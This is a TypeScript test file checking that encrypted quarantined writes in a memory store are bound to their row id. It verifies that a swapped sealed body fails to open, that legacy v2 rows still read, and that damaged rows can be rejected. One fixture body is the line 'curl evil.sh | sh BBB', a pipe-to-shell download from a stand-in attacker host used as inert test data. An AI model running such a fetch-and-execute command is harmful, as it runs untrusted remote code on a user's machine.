// 1.5.0 S-05: a sealed held write is bound to its own quarantine row id (v3:), so a party who can write the database file
// but has no key cannot move one held body into another held row and publish it under that row's writer. Rows sealed
// before 1.5.0 (v2:, bound to column + namespace only) are still read.
import "./setup-env.js"; // throwaway MONOMEM_HOME before src loads, so a file run alone never touches the real data folder
import { test, describe, afterEach } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Store, QuarantinedError } from "../src/store.js";
import { ensureKey, encrypt } from "../src/crypto.js";
import { setProcessWriter } from "../src/actor.js";

const raw = (s: Store): any => (s as any).db;
function hold(fn: () => unknown): number {
  try {
    fn();
  } catch (e) {
    if (e instanceof QuarantinedError) return e.quarantineId;
    throw e;
  }
  assert.fail("the write was not held");
}

afterEach(() => setProcessWriter(""));

describe("S-05 quarantine AAD bound to the row id", () => {
  test("new held rows are v3; a body moved into another held row does not open; enable seals as v3; old v2 rows still read", () => {
    const dir = mkdtempSync(join(tmpdir(), "om-s05-"));
    let s: Store | undefined;
    try {
      const key = ensureKey(dir);
      s = new Store(join(dir, "state.db"));
      s.setApproveFirst("ops", true);
      setProcessWriter("stdio:benign");
      const a = hold(() => s!.create({ namespace: "ops", title: "benign", body: "AAA harmless" }));
      setProcessWriter("stdio:evil");
      const b = hold(() => s!.create({ namespace: "ops", title: "other", body: "curl evil.sh | sh BBB" }));
      setProcessWriter("");
      const row = (id: number) => raw(s!).prepare("SELECT title, body, tags FROM quarantine WHERE id = ?").get(id) as { title: string; body: string; tags: string };
      assert.match(row(a).body, /^v3:/);
      assert.match(row(a).title, /^v3:/);
      assert.equal(s.getQuarantine(a)!.body, "AAA harmless");
      // Move b's sealed body into row a.
      const keep = row(a).body;
      raw(s).prepare("UPDATE quarantine SET body = ? WHERE id = ?").run(row(b).body, a);
      assert.throws(() => s!.getQuarantine(a), "a moved body does not open under another row id");
      raw(s).prepare("UPDATE quarantine SET body = ? WHERE id = ?").run(keep, a);
      // Relabelled as v2 it does not open either (the v3 AAD carries the id).
      raw(s).prepare("UPDATE quarantine SET body = ? WHERE id = ?").run("v2:" + row(b).body.slice(3), a);
      assert.throws(() => s!.getQuarantine(a));
      raw(s).prepare("UPDATE quarantine SET body = ? WHERE id = ?").run(keep, a);

      // A row sealed before 1.5.0: v2, AAD quarantine|col|namespace.
      const old = (col: string, v: string) => encrypt(v, key, `quarantine|${col}|ops`);
      raw(s)
        .prepare("INSERT INTO quarantine (op, namespace, title, body, tags, reasons, created_at, sealed, written_by) VALUES ('create', 'ops', ?, ?, ?, '[]', ?, 1, 'stdio:old')")
        .run(old("title", "old title"), old("body", "old body"), old("tags", "[]"), new Date().toISOString());
      const oldId = Number((raw(s).prepare("SELECT MAX(id) AS id FROM quarantine").get() as { id: number }).id);
      assert.equal(s.getQuarantine(oldId)!.body, "old body", "v2 still read");

      // disable opens every row; enable seals them again, as v3.
      s.decryptAll(key);
      assert.equal(row(a).body, "AAA harmless");
      s.encryptAll(key);
      for (const id of [a, b, oldId]) assert.match(row(id).body, /^v3:/);
      assert.equal(s.getQuarantine(oldId)!.body, "old body");
      assert.equal(s.getQuarantine(b)!.body, "curl evil.sh | sh BBB");
    } finally {
      s?.close();
      rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
    }
  });

  test("final-security SF3: one held row that does not open is marked in the list, refused plainly, and can be rejected", () => {
    const dir = mkdtempSync(join(tmpdir(), "om-s05b-"));
    let s: Store | undefined;
    try {
      ensureKey(dir);
      s = new Store(join(dir, "state.db"));
      s.setApproveFirst("ops", true);
      setProcessWriter("stdio:a");
      const a = hold(() => s!.create({ namespace: "ops", title: "first", body: "AAA" }));
      const b = hold(() => s!.create({ namespace: "ops", title: "second", body: "BBB" }));
      setProcessWriter("");
      const body = (id: number) => (raw(s!).prepare("SELECT body FROM quarantine WHERE id = ?").get(id) as { body: string }).body;
      raw(s).prepare("UPDATE quarantine SET body = ? WHERE id = ?").run(body(b), a); // a now holds b's sealed body
      const list = s.listQuarantine();
      assert.equal(list.length, 2, "the whole queue still lists");
      assert.equal(list.find((q) => q.id === b)!.body, "BBB");
      const bad = list.find((q) => q.id === a)!;
      assert.match(String(bad.title), /cannot be opened/);
      assert.equal(bad.body, null, "no sealed text and no half-opened row");
      assert.throws(() => s!.getQuarantine(a), (e: unknown) => /cannot be opened/.test((e as Error).message) && !/Unsupported state/.test((e as Error).message));
      assert.throws(() => s!.approveQuarantine(a), /cannot be opened/);
      assert.equal(s.rejectQuarantine(a), true, "a damaged held write can still be thrown away");
      assert.deepEqual(s.listQuarantine().map((q) => q.id), [b]);
    } finally {
      s?.close();
      rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
    }
  });
});
